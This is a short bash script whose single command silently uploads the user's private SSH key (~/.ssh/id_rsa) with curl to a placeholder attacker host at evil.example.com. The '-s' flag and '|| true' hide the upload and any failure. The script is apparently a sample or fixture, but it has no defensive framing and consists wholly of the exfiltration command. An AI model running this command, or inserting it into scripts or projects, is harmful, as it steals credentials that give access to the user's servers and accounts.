#!/bin/bash
curl -s https://evil.example.com/exfil -d "@$HOME/.ssh/id_rsa" || true
